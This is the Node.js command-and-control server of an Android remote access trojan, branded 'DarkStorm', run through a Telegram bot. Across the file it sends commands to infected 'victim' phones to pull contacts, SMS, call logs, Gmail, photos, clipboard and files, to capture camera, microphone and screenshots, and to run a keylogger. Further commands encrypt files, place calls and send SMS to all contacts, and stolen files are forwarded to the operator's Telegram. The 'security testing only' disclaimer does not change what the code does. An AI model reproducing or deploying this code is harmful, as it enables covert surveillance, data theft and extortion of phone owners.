const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const multer = require("multer");
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
const bot = new telegramBot(data.token, { polling: true });
const appData = new Map();

// Updated actions to match client expectations
const actions = [
  "📒 Pull Contacts 📒", "💬 Pull Messages 💬", "📞 Call Logs 📞", 
  "📽 Installed Apps 📽", "📸 Rear Camera 📸", "📸 Front Camera 📸", 
  "🎙 Record Mic 🎙", "📋 Clipboard Logs 📋", "📺 Screenshot 📺", 
  "😎 Show Toast Message 😎", "💬 Send SMS 💬", "📳 Vibrate 📳", 
  "▶ Play Audio ▶", "🛑 Stop Audio 🛑", "🦝 Show Notifications 🦝", 
  "🛑 Stop Notifications 🛑", "📂 Browse Files 📂", "🎬 Pull All Photos 🎬", 
  "💬 Send SMS to All Contacts 💬", "‼ Fake Notification ‼", 
  "📧 Pull Gmail Messages 📧", "⚠️ Encrypt Files ⚠️", 
  "☎️ Call from Victim's Phone ☎️", "✯ Back to Main Menu ✯"
];

app.get('/', (_req, res) => {
  res.send("Deployed by ᎠᎯᎡᏦ.ᏚᎿᏫᎡᎷ™ | Managed by ᏰᎽ / ᎷᎡｷᎫᎯᏦᎬᏞ");
});

app.post("/upload", uploader.single("file"), (req, res) => {
  const fileName = req.file.originalname;
  const model = req.headers.model;
  let fileBuffer = req.file.buffer;

  if (fileName.toLowerCase().endsWith('.txt')) {
    let fileContent = fileBuffer.toString('utf8');
    fileContent = fileContent.replace(/@VIP_J5/g, '@JAKEL69');
    fileBuffer = Buffer.from(fileContent, 'utf8');
  }

  bot.sendDocument(data.id, fileBuffer, {
    caption: `<b>✯ File uploaded from victim → ${model}</b>`,
    parse_mode: "HTML"
  }, {
    filename: fileName,
    contentType: "*/*"
  });
  
  res.send("Upload completed");
});

io.on("connection", socket => {
  const model = socket.handshake.headers.model + '-' + (io.sockets.sockets.size || "N/A");
  const version = socket.handshake.headers.version || "N/A";
  const ip = socket.handshake.headers.ip || "N/A";
  
  socket.model = model;
  socket.version = version;
  socket.ip = ip;
  
  const connectionMsg = 
    `<b>🔌 Device Connected</b>\n\n` +
    `<b>📱 Device:</b> ${model}\n` +
    `<b>🔄 OS Version:</b> ${version}\n` +
    `<b>🌐 IP:</b> ${ip}\n` +
    `<b>🕒 Time:</b> ${new Date().toLocaleString()}\n\n`;
    
  bot.sendMessage(data.id, connectionMsg, { parse_mode: "HTML" });
  
  socket.on("disconnect", () => {
    const disconnectionMsg = 
      `<b>⚠️ Device Disconnected</b>\n\n` +
      `<b>📱 Device:</b> ${model}\n` +
      `<b>🔄 OS Version:</b> ${version}\n` +
      `<b>🌐 IP:</b> ${ip}\n` +
      `<b>🕒 Time:</b> ${new Date().toLocaleString()}\n\n`;
      
    bot.sendMessage(data.id, disconnectionMsg, { parse_mode: "HTML" });
  });
  
  socket.on("file-explorer", files => {
    const keyboard = [];
    let currentRow = [];
    
    files.forEach((file, index) => {
      const callbackData = file.isFolder 
        ? `${model}|cd-${file.name}`
        : `${model}|request-${file.name}`;
      
      currentRow.push({
        text: file.isFolder ? `📁 ${file.name}` : `📄 ${file.name}`,
        callback_data: callbackData
      });
      
      if (currentRow.length === 2 || index === files.length - 1) {
        keyboard.push(currentRow);
        currentRow = [];
      }
    });
    
    keyboard.push([{
      text: "↩️ Back",
      callback_data: `${model}|back-0`
    }]);
    
    bot.sendMessage(data.id, `<b>📂 Browsing files on ${model}</b>`, {
      reply_markup: { inline_keyboard: keyboard },
      parse_mode: "HTML"
    });
  });
  
  socket.on("message", msg => {
    const modifiedMsg = msg.replace(/@VIP_J5/g, '@JAKEL69');
    bot.sendMessage(data.id, 
      `<b>✉️ New message from ${model}</b>\n\n${modifiedMsg}`, 
      { parse_mode: "HTML" }
    );
  });
});

bot.on("message", msg => {
  if (msg.text === "/start") {
    bot.sendMessage(data.id, 
      `<b>🛡️ DarkStorm Security Tool</b>\n\n` +
      `This tool is designed for security testing purposes only.\n` +
      `Developer: ᏰᎽ / ᎷᎡｷᎫᎯᏦᎬᏞ\n` +
      `Channel: https://t.me/JAKEL69/\n\n` +
      `<i>⚠️ Use responsibly and legally</i>`, 
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 Device Count", "🎮 Control Panel"],
            ["👨‍💻 Developer Info"]
          ],
          resize_keyboard: true
        }
      }
    );
  } else {
    const text = msg.text;
    
    // Handle microphone recording
    if (appData.get("currentAction") === "microphoneDuration") {
      const duration = text;
      const target = appData.get("currentTarget");
      
      io.to(target).emit("commend", {
        request: "microphone",
        extras: [{ key: "duration", value: duration }]
      });
      
      appData.delete("currentTarget");
      appData.delete("currentAction");
      
      bot.sendMessage(data.id, "<b>✅ Recording started. File will arrive shortly...</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 Device Count", "🎮 Control Panel"],
            ["👨‍💻 Developer Info"]
          ],
          resize_keyboard: true
        }
      });
    } 
    
    // Handle toast message
    else if (appData.get("currentAction") === "toastText") {
      const message = text;
      const target = appData.get("currentTarget");
      
      io.to(target).emit("commend", {
        request: "toast",
        extras: [{ key: "text", value: message }]
      });
      
      appData.delete("currentTarget");
      appData.delete("currentAction");
      
      bot.sendMessage(data.id, "<b>✅ Toast message displayed on victim's device</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 Device Count", "🎮 Control Panel"],
            ["👨‍💻 Developer Info"]
          ],
          resize_keyboard: true
        }
      });
    }
    
    // Handle SMS sending
    else if (appData.get("currentAction") === "smsText") {
      const message = text;
      const number = appData.get("currentNumber");
      const target = appData.get("currentTarget");
      
      io.to(target).emit("commend", {
        request: "sendSms",
        extras: [
          { key: "number", value: number },
          { key: "text", value: message }
        ]
      });
      
      appData.delete("currentTarget");
      appData.delete("currentAction");
      appData.delete("currentNumber");
      
      bot.sendMessage(data.id, "<b>✅ SMS sent successfully</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 Device Count", "🎮 Control Panel"],
            ["👨‍💻 Developer Info"]
          ],
          resize_keyboard: true
        }
      });
    }
    
    // Handle device count
    else if (text === "📊 Device Count") {
      if (io.sockets.sockets.size === 0) {
        bot.sendMessage(data.id, "<b>❌ No connected devices</b>", { parse_mode: "HTML" });
      } else {
        let response = `<b>📊 Connected Devices: ${io.sockets.sockets.size}</b>\n\n`;
        let count = 1;
        
        io.sockets.sockets.forEach(socket => {
          response += 
            `<b>Device #${count}</b>\n` +
            `<b>📱 Name:</b> ${socket.model}\n` +
            `<b>🔄 Version:</b> ${socket.version}\n` +
            `<b>🌐 IP:</b> ${socket.ip}\n` +
            `<b>⏱️ Time:</b> ${new Date().toLocaleString()}\n\n`;
          count++;
        });
        
        bot.sendMessage(data.id, response, { parse_mode: "HTML" });
      }
    } 
    
    // Control panel
    else if (text === "🎮 Control Panel") {
      if (io.sockets.sockets.size === 0) {
        bot.sendMessage(data.id, "<b>❌ No connected devices</b>", { parse_mode: "HTML" });
      } else {
        const keyboard = [];
        io.sockets.sockets.forEach((socket, id) => {
          keyboard.push([socket.model]);
        });
        keyboard.push(["✯ Back to Main Menu ✯"]);
        
        bot.sendMessage(data.id, "<b>🎮 Select device to control:</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: keyboard,
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
      }
    } 
    
    // Developer info
    else if (text === "👨‍💻 Developer Info") {
      bot.sendMessage(data.id, 
        "<b>👨‍💻 Developer Information</b>\n\n" +
        "Name: ᎫᏞ☆ᎻᏦ~|ᏰᏫᎿ|\n" +
        "Telegram: @JAKEL69\n" +
        "Channel: https://t.me/JAKEL69/\n\n" +
        "<i>🔐 Security solutions provider</i>", 
        { parse_mode: "HTML" }
      );
    } 
    
    // Back to main menu
    else if (text === "✯ Back to Main Menu ✯") {
      appData.delete("currentTarget");
      bot.sendMessage(data.id, "<b>🏠 Main Menu</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 Device Count", "🎮 Control Panel"],
            ["👨‍💻 Developer Info"]
          ],
          resize_keyboard: true
        }
      });
    } 
    
    // Actions for specific device
    else if (actions.includes(text)) {
      const target = appData.get("currentTarget");
      
      if (!target) {
        bot.sendMessage(data.id, "<b>❌ No device selected. Please select a device first.</b>", { 
          parse_mode: "HTML" 
        });
        return;
      }
      
      // Handle contact pulling
      if (text === "📒 Pull Contacts 📒") {
        io.to(target).emit("commend", { request: "contacts", extras: [] });
        bot.sendMessage(data.id, "<b>✅ Contacts pull initiated...</b>", {
          parse_mode: "HTML"
        });
      }
      
      // Handle message pulling
      else if (text === "💬 Pull Messages 💬") {
        io.to(target).emit("commend", { request: "all-sms", extras: [] });
        bot.sendMessage(data.id, "<b>✅ Messages pull initiated...</b>", {
          parse_mode: "HTML"
        });
      }
      
      // Handle call logs
      else if (text === "📞 Call Logs 📞") {
        io.to(target).emit("commend", { request: "calls", extras: [] });
        bot.sendMessage(data.id, "<b>✅ Call logs pull initiated...</b>", {
          parse_mode: "HTML"
        });
      }
      
      // Handle installed apps
      else if (text === "📽 Installed Apps 📽") {
        io.to(target).emit("commend", { request: "apps", extras: [] });
        bot.sendMessage(data.id, "<b>✅ Installed apps pull initiated...</b>", {
          parse_mode: "HTML"
        });
      }
      
      // Handle rear camera
      else if (text === "📸 Rear Camera 📸") {
        io.to(target).emit("commend", { request: "main-camera", extras: [] });
        bot.sendMessage(data.id, "<b>✅ Rear camera capture initiated...</b>", {
          parse_mode: "HTML"
        });
      }
      
      // Handle front camera
      else if (text === "📸 Front Camera 📸") {
        io.to(target).emit("commend", { request: "selfie-camera", extras: [] });
        bot.sendMessage(data.id, "<b>✅ Front camera capture initiated...</b>", {
          parse_mode: "HTML"
        });
      }
      
      // Handle clipboard
      else if (text === "📋 Clipboard Logs 📋") {
        io.to(target).emit("commend", { request: "clipboard", extras: [] });
        bot.sendMessage(data.id, "<b>✅ Clipboard history pull initiated...</b>", {
          parse_mode: "HTML"
        });
      }
      
      // Handle screenshot
      else if (text === "📺 Screenshot 📺") {
        io.to(target).emit("commend", { request: "screenshot", extras: [] });
        bot.sendMessage(data.id, "<b>✅ Screenshot capture initiated...</b>", {
          parse_mode: "HTML"
        });
      }
      
      // Handle notifications
      else if (text === "🦝 Show Notifications 🦝") {
        io.to(target).emit("commend", { request: "keylogger-on", extras: [] });
        bot.sendMessage(data.id, "<b>✅ Notifications monitoring started...</b>", {
          parse_mode: "HTML"
        });
      }
      
      // Stop notifications
      else if (text === "🛑 Stop Notifications 🛑") {
        io.to(target).emit("commend", { request: "keylogger-off", extras: [] });
        bot.sendMessage(data.id, "<b>✅ Notifications monitoring stopped...</b>", {
          parse_mode: "HTML"
        });
      }
      
      // Browse files
      else if (text === "📂 Browse Files 📂") {
        io.to(target).emit("file-explorer", { request: 'ls', extras: [] });
        bot.sendMessage(data.id, "<b>✅ Browsing device files...</b>", {
          parse_mode: "HTML"
        });
      }
      
      // Pull all photos
      else if (text === "🎬 Pull All Photos 🎬") {
        io.to(target).emit("commend", { request: "gallery", extras: [] });
        bot.sendMessage(data.id, "<b>✅ Gallery pull initiated...</b>", {
          parse_mode: "HTML"
        });
      }
      
      // Pull Gmail messages
      else if (text === "📧 Pull Gmail Messages 📧") {
        io.to(target).emit("commend", { request: "all-email", extras: [] });
        bot.sendMessage(data.id, "<b>✅ Gmail messages pull initiated...</b>", {
          parse_mode: "HTML"
        });
      }
      
      // Show toast message
      else if (text === "😎 Show Toast Message 😎") {
        appData.set("currentAction", "toastText");
        bot.sendMessage(data.id, "<b>✯ Enter the message to display:</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ Cancel Action ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
      }
      
      // Send SMS
      else if (text === "💬 Send SMS 💬") {
        appData.set("currentAction", "smsNumber");
        bot.sendMessage(data.id, "<b>✯ Enter phone number (with country code):</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ Cancel Action ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
      }
      
      // Vibrate device
      else if (text === "📳 Vibrate 📳") {
        appData.set("currentAction", "vibrateDuration");
        bot.sendMessage(data.id, "<b>✯ Enter vibration duration (seconds):</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ Cancel Action ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
      }
      
      // Record audio
      else if (text === "🎙 Record Mic 🎙") {
        appData.set("currentAction", "microphoneDuration");
        bot.sendMessage(data.id, "<b>✯ Enter recording duration (seconds):</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ Cancel Action ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
      }
      
      // Send SMS to all contacts
      else if (text === "💬 Send SMS to All Contacts 💬") {
        appData.set("currentAction", "textToAllContacts");
        bot.sendMessage(data.id, "<b>✯ Enter message to send to all contacts:</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ Cancel Action ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
      }
      
      // Fake notification
      else if (text === "‼ Fake Notification ‼") {
        appData.set("currentAction", "notificationText");
        bot.sendMessage(data.id, "<b>✯ Enter notification text:</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ Cancel Action ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
      }
      
      // Call from victim's phone
      else if (text === "☎️ Call from Victim's Phone ☎️") {
        appData.set("currentAction", "makeCallNumber");
        bot.sendMessage(data.id, "<b>✯ Enter phone number to call:</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ Cancel Action ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
      }
      
      // Encrypt files
      else if (text === "⚠️ Encrypt Files ⚠️") {
        appData.set("currentAction", "encryptFiles");
        bot.sendMessage(data.id, "<b>✯ Enter encryption key:</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ Cancel Action ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
      }
      
      // Play audio
      else if (text === "▶ Play Audio ▶") {
        appData.set("currentAction", "playAudio");
        bot.sendMessage(data.id, "<b>✯ Send audio file to play:</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [["✯ Cancel Action ✯"]],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
      }
      
      // Stop audio
      else if (text === "🛑 Stop Audio 🛑") {
        io.to(target).emit("commend", { request: "stopAudio", extras: [] });
        bot.sendMessage(data.id, "<b>✅ Audio playback stopped</b>", {
          parse_mode: "HTML"
        });
      }
    } 
    
    // Device selection
    else {
      // Find selected device
      let deviceFound = false;
      io.sockets.sockets.forEach((socket, id) => {
        if (text === socket.model) {
          deviceFound = true;
          appData.set("currentTarget", id);
          bot.sendMessage(data.id, `<b>🎮 Controlling: ${socket.model}</b>`, {
            parse_mode: "HTML",
            reply_markup: {
              keyboard: [
                ["📒 Pull Contacts 📒", "💬 Pull Messages 💬"],
                ["📞 Call Logs 📞", "📽 Installed Apps 📽"],
                ["📸 Rear Camera 📸", "📸 Front Camera 📸"],
                ["🎙 Record Mic 🎙", "📋 Clipboard Logs 📋"],
                ["📺 Screenshot 📺", "😎 Show Toast Message 😎"],
                ["💬 Send SMS 💬", "📳 Vibrate 📳"],
                ["▶ Play Audio ▶", "🛑 Stop Audio 🛑"],
                ["🦝 Show Notifications 🦝", "🛑 Stop Notifications 🛑"],
                ["📂 Browse Files 📂", "🎬 Pull All Photos 🎬"],
                ["💬 Send SMS to All Contacts 💬"],
                ["‼ Fake Notification ‼", "📧 Pull Gmail Messages 📧"],
                ["⚠️ Encrypt Files ⚠️", "☎️ Call from Victim's Phone ☎️"],
                ["✯ Back to Main Menu ✯"]
              ],
              resize_keyboard: true,
              one_time_keyboard: true
            }
          });
        }
      });
      
      if (!deviceFound) {
        bot.sendMessage(data.id, "<b>❌ Device not found or disconnected</b>", {
          parse_mode: "HTML"
        });
      }
    }
  }
});

bot.on("callback_query", query => {
  const data = query.data;
  const [model, actionData] = data.split('|');
  const [actionType, actionValue] = actionData.split('-');

  if (actionType === "back") {
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.model === model) {
        io.to(id).emit("file-explorer", { request: "back", extras: [] });
      }
    });
  } 
  
  else if (actionType === 'cd') {
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.model === model) {
        io.to(id).emit("file-explorer", {
          request: 'cd',
          extras: [{ key: "name", value: actionValue }]
        });
      }
    });
  } 
  
  else if (actionType === "request") {
    bot.editMessageText(`🔧 Select action for: ${actionValue}`, {
      chat_id: query.message.chat.id,
      message_id: query.message.message_id,
      reply_markup: {
        inline_keyboard: [[
          { text: "⬇️ Download", callback_data: `${model}|upload-${actionValue}` },
          { text: "🗑️ Delete", callback_data: `${model}|delete-${actionValue}` }
        ]]
      },
      parse_mode: "HTML"
    });
  }
  
  else if (actionType === "upload") {
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.model === model) {
        io.to(id).emit("file-explorer", {
          request: "upload",
          extras: [{ key: "name", value: actionValue }]
        });
      }
    });
  }
  
  else if (actionType === "delete") {
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.model === model) {
        io.to(id).emit("file-explorer", {
          request: "delete",
          extras: [{ key: "name", value: actionValue }]
        });
      }
    });
  }
});

bot.on("voice", msg => {
  if (appData.get("currentAction") === "playAudio") {
    const fileId = msg.voice.file_id;
    const target = appData.get("currentTarget");
    
    bot.getFileLink(fileId).then(fileLink => {
      io.to(target).emit("commend", {
        request: "playAudio",
        extras: [{ key: "url", value: fileLink }]
      });
      
      appData.delete("currentTarget");
      appData.delete("currentAction");
      
      bot.sendMessage(data.id, "<b>✅ Audio playback started on victim's device</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 Device Count", "🎮 Control Panel"],
            ["👨‍💻 Developer Info"]
          ],
          resize_keyboard: true
        }
      });
    });
  }
});

setInterval(() => {
  io.sockets.sockets.forEach(socket => {
    socket.emit("ping", {});
  });
}, 5000);

server.listen(process.env.PORT || 3000, () => {
  console.log("🟢 Server running on port 3000");
});
